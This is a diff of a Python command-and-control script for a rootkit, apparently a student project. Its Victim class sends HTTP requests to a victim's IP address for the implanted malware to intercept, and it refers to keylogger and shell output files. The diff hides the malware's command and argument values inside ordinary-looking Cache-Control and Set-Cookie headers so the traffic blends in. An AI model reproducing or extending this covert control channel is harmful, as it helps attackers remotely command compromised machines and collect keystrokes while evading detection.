@@ -6,7 +6,7 @@ MALWARE_STATUS_CODE = 200  # Change this to 666
 MALWARE_HEADER_RESPONSE = 'Content-Encoding'  # Change this to malware-response
 WEB_FOLDER = "/home/shahart/colman_rootkit"
 OUTPUT_SHELL_FILENAME = "output"
-OUTPUT_KL_FILENAME = "klog"
+OUTPUT_KL_FILENAME = "klog.log"
 
 class Victim:
 
@@ -140,10 +140,10 @@ class Victim:
         """Send an HTTP packet to be intercepted by the malware"""
 
         if len(args) != 0:
-            headers = {"colman-function": function,
-                       "colman-arg": ";".join(args)}
+            headers = {"Cache-Control": function,
+                       "Set-Cookie": ";".join(args)}
         else:
-            headers = {"colman-function": function}
+            headers = {"Cache-Control": function}
 
         try:
             return requests.get("http://%s/" % self.victim_ip,
